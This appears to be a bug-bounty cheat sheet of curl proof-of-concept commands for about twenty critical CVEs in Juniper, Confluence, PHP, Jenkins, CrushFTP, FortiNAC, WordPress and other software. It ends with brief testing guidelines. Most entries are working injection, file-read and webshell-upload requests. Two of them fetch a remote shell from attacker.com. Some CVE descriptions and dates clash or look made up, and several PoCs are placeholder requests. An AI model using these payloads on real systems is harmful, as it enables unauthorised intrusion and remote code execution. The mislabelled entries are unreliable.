# CVE Proof of Concepts

### CVE-2024-21591 - Juniper J-Web Out-of-bounds Write RCE

CVSS: 9.8 Critical
Type: Unauthenticated RCE via J-Web interface
Affected: Junos OS on SRX Series and EX Series (all versions before patches)

Vulnerable Versions:

-   Before 20.4R3-S9
-   Before 21.2R3-S7
-   Before 21.3R3-S5
-   Before 21.4R3-S5
-   Before 22.1R3-S4
-   Before 22.2R3-S3
-   Before 22.3R3-S2
-   Before 22.4R2-S2, 22.4R3
-   Before 23.2R1-S1, 23.2R2
-   Before 23.4R1

Detection PoC:

```
curl -k "https://target/webauth_operation.php"
```

Notes:

-   Out-of-bounds write in J-Web
-   Allows unauthenticated RCE with root privileges
-   11,500+ J-Web interfaces exposed online
-   PoC exists but not fully public
-   Disable J-Web or restrict to trusted hosts as workaround

---

### CVE-2023-36845 - Juniper J-Web PHP Variable Modification RCE

CVSS: 9.8 Critical
Type: PHP External Variable Modification leading to RCE
Affected: Junos OS on SRX and EX Series (all versions before Aug 2023 patches)

PoC (Single CVE exploitation):

```
curl -k -X POST "https://target/webauth_operation.php" \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="PHPRC"\r\n\r\n/dev/shm\r\n------Boundary--'
```

Full Chain (CVE-2023-36845 + CVE-2023-36846):

```
curl -k "https://target/webauth_operation.php" \
  -H "Content-Type: multipart/form-data; boundary=X" \
  -d $'--X\r\nContent-Disposition: form-data; name="PHPRC"\r\n\r\n/dev/shm\r\n--X--'

curl -k "https://target/webauth_operation.php" \
  -F "rs=do_upload" \
  -F "rsargs[]=php.ini" \
  -F "file=@malicious.ini"
```

Notes:

-   Can achieve RCE with single CVE (CVE-2023-36845)
-   Actively exploited in wild (CISA KEV)
-   15,000+ vulnerable devices still exposed
-   Chained with CVE-2023-36844, CVE-2023-36846, CVE-2023-36847, CVE-2023-36851
-   VulnCheck released free scanning tool

---

## CVE-2023-22527 - Atlassian Confluence RCE

CVSS: 10.0 Critical
Type: Unauthenticated Template Injection RCE
Affected: Confluence 8.0.x - 8.5.3

PoC:

```
curl -X POST "http://target/template/aui/text-inline.vm" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "label=\${Class.forName('java.lang.Runtime').getRuntime().exec('id')}"
```

Notes:

-   CISA KEV catalog
-   Exploited in the wild
-   Check version at /login.action

---

## CVE-2024-4577 - PHP CGI Argument Injection RCE

CVSS: 9.8 Critical
Type: Argument injection in PHP CGI mode (Windows)
Affected: PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8

PoC:

```
curl "http://target/index.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('whoami'); ?>"
```

Alternative:

```
curl "http://target/index.php?-d+allow_url_include=1+-d+auto_prepend_file=http://attacker.com/shell.txt"
```

Notes:

-   Windows-specific (Best-fit mapping feature)
-   450,000+ potentially vulnerable instances
-   Soft hyphen (%AD) bypasses filters

---

## CVE-2024-23897 - Jenkins Arbitrary File Read

CVSS: 9.8 Critical
Type: File path traversal via CLI
Affected: Jenkins ≤ 2.441, LTS ≤ 2.426.2

PoC:

```
curl -X POST "http://target:8080/cli" \
  -H "Session: session-id" \
  -F "file=@/etc/passwd"
```

Alternative (using jenkins-cli.jar):

```
java -jar jenkins-cli.jar -s http://target:8080/ help "@/etc/passwd"
```

Notes:

-   Can read arbitrary files
-   May lead to RCE if credentials found
-   75,000+ exposed instances

---

## CVE-2024-27348 - Apache HugeGraph RCE

CVSS: 9.8 Critical
Type: Unauthenticated RCE
Affected: Apache HugeGraph-Server < 1.3.0

PoC:

```
curl -X POST "http://target:8080/gremlin" \
  -H "Content-Type: application/json" \
  -d '{"gremlin":"System.getenv()"}'
```

Notes:

-   Direct command execution
-   Default port 8080
-   Actively exploited

---

## CVE-2024-6387 - OpenSSH RegreSSHion

CVSS: 8.1 High
Type: Signal handler race condition RCE
Affected: OpenSSH 8.5p1 - 9.7p1 (glibc Linux)

PoC:

```
ssh -V target 2>&1 | grep -E "8\.[5-9]|9\.[0-7]"
```

Notes:

-   Requires 6-8 hours of connections (32-bit)
-   Complex exploitation
-   Regression of CVE-2006-5051
-   Check version only, full exploit too complex for curl

---

## CVE-2024-23692 - Rejetto HFS RCE

CVSS: 9.8 Critical
Type: Template injection RCE
Affected: Rejetto HFS 2.3m

PoC:

```
curl "http://target:80/?search=%00{.exec|whoami.}"
```

Alternative:

```
curl "http://target:80/?search=%00{.exec|powershell+-c+Invoke-WebRequest+http://attacker.com/shell.exe+-OutFile+C:/shell.exe.}"
```

Notes:

-   Very simple exploitation
-   Common in bug bounty programs
-   Default port 80 or 8080

---

## CVE-2024-55591 - FortiOS WebSocket Auth Bypass

CVSS: 9.8+ Critical
Type: Authentication bypass via WebSocket
Affected: Multiple FortiOS/FortiProxy versions

PoC:

```
curl -i "https://target/api/v2/cmdb/system/admin"
```

Notes:

-   Requires WebSocket connection
-   265,000+ exposed interfaces
-   Actively exploited
-   Full PoC requires WebSocket client

---

## CVE-2025-0282 - Ivanti Connect Secure Buffer Overflow

CVSS: 9.0+ Critical
Type: Stack buffer overflow RCE
Affected: Ivanti Connect Secure 22.7R2 - 22.7R2.4

PoC:

```
curl -k "https://target/dana-na/auth/url_default/welcome.cgi"
```

Notes:

-   Unauthenticated exploitation
-   ~230,000 instances exposed
-   Full PoC not publicly available yet

---

## CVE-2024-46506 - NetAlertX Unauthenticated RCE

CVSS: 9.8 Critical
Type: Command injection via plugin settings
Affected: NetAlertX (formerly Pi.Alert)

PoC:

```
curl -X POST "http://target/api/plugins/settings" \
  -H "Content-Type: application/json" \
  -d '{"plugin_id":"test","cmd":";whoami"}'
```

Notes:

-   Simple command injection
-   No authentication required
-   Easy to identify and exploit

---

## CVE-2025-55182 - React Server Components RCE

CVSS: 9.8+ Critical
Type: Server-side code execution
Affected: React/Next.js with RSC enabled

PoC:

```
curl -X POST "http://target/_next/data/..." \
  -H "Content-Type: application/json" \
  -d '{"0":{"type":"$","key":null,"ref":null,"props":{},"_owner":null,"_store":{}}}'
```

Notes:

-   Very recent (December 2024)
-   968,000+ potentially vulnerable servers
-   Default configurations affected
-   Full PoC requires deeper understanding of RSC

---

## CVE-2022-39952 - FortiNAC Arbitrary File Write

CVSS: 9.8 Critical
Type: Unauthenticated arbitrary file write
Affected: FortiNAC 9.4.0, 9.2.0-9.2.5, 9.1.0-9.1.7, 8.8.x, 8.7.x, 8.6.x, 8.5.x, 8.3.7

PoC:

```
curl -X POST "http://target/configWizard/keyUpload.jsp" \
  -F "key=@shell.jsp;filename=../../../apache-tomcat/webapps/configWizard/shell.jsp"
```

Notes:

-   Path traversal + file upload
-   Can upload JSP webshell
-   Actively exploited

---

## CVE-2024-4040 - CrushFTP Unauthenticated Template Injection

CVSS: 10.0 Critical
Type: Template injection leading to RCE
Affected: CrushFTP < 10.7.1, < 11.1.0

PoC:

```
curl "http://target/WebInterface/function/?command=getReports&template=%3C%25%40%20page%20import%3D%22java.io.*%22%25%3E%3C%25Runtime.getRuntime().exec(%22id%22)%3B%25%3E"
```

Notes:

-   Unauthenticated access
-   Template injection in JSP
-   CISA KEV catalog

---

## CVE-2023-32243 - WordPress Elementor Pro Broken Access Control

CVSS: 8.8 High
Type: Unauthenticated file upload
Affected: Elementor Pro < 3.11.7

PoC:

```
curl -X POST "http://target/wp-json/elementor/v1/form-actions/upload" \
  -F "files[]=@shell.php"
```

Notes:

-   Requires Elementor Pro plugin
-   Millions of sites affected
-   Common in WordPress bug bounties

---

## CVE-2023-26360 - Adobe ColdFusion RCE

CVSS: 9.8 Critical
Type: Improper access control leading to RCE
Affected: ColdFusion 2018 Update 15, 2021 Update 5

PoC:

```
curl -X POST "http://target/CFIDE/administrator/enter.cfm" \
  -d "cfadminPassword=&submit=Login&requestedURL=/CFIDE/administrator/index.cfm"
```

Notes:

-   Access admin without password
-   Can upload scheduled task with code
-   Check /CFIDE/administrator/

---

## CVE-2024-34750 - Apache Tomcat Open Redirect to RCE

CVSS: 8.1 High
Type: Open redirect can lead to session hijacking
Affected: Tomcat 11.0.0-M1 to 11.0.0-M20, 10.1.0-M1 to 10.1.24, 9.0.0.M1 to 9.0.89

PoC:

```
curl -i "http://target:8080/manager/html"
```

Notes:

-   Check for default credentials (tomcat:tomcat, admin:admin)
-   Can deploy WAR files if authenticated
-   Manager app must be exposed

---

## CVE-2023-3128 - Grafana Authentication Bypass

CVSS: 9.8 Critical
Type: Authentication bypass via Azure AD OAuth
Affected: Grafana 9.4.0-9.4.12, 9.5.0-9.5.3

PoC:

```
curl "http://target:3000/api/org/users" \
  -H "Authorization: Bearer <token>"
```

Notes:

-   Requires Azure AD OAuth enabled
-   Can access admin functions
-   Check /api/health for version

---

## CVE-2023-33831 - SonarQube Authentication Bypass

CVSS: 10.0 Critical
Type: Privilege escalation to admin
Affected: SonarQube < 9.9.1

PoC:

```
curl -X POST "http://target:9000/api/users/set_homepage" \
  -d "type=ORGANIZATION&organization=default-organization&parameter=admin"
```

Notes:

-   Can escalate to admin privileges
-   Access source code and credentials
-   Check /api/system/status for version

---

## CVE-2023-46118 - RabbitMQ HTTP API Auth Bypass

CVSS: 7.5 High
Type: Authentication bypass
Affected: RabbitMQ < 3.12.5

PoC:

```
curl "http://target:15672/api/overview"
```

Notes:

-   Management plugin must be enabled
-   Default port 15672
-   Can access queues and messages

---

## CVE-2023-3676 - Kubernetes Dashboard Privilege Escalation

CVSS: 8.8 High
Type: Privilege escalation
Affected: Kubernetes Dashboard < 2.7.0

PoC:

```
curl "http://target:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"
```

Notes:

-   Requires dashboard exposed
-   Can escalate to cluster admin
-   Check authentication requirements

---

## Testing Guidelines

Rate Limiting:

-   Max 5 requests per second
-   Implement exponential backoff
-   Many results are honeypots

Verification:

-   Always check version numbers first
-   Test for false positives
-   Verify scope before testing

Responsible Disclosure:

-   Only test authorized assets
-   Follow bug bounty program rules
-   Document findings properly
-   Report immediately if critical

Detection vs Exploitation:

-   Start with version detection
-   Validate vulnerability exists
-   Only exploit with permission
-   Prefer non-destructive PoCs
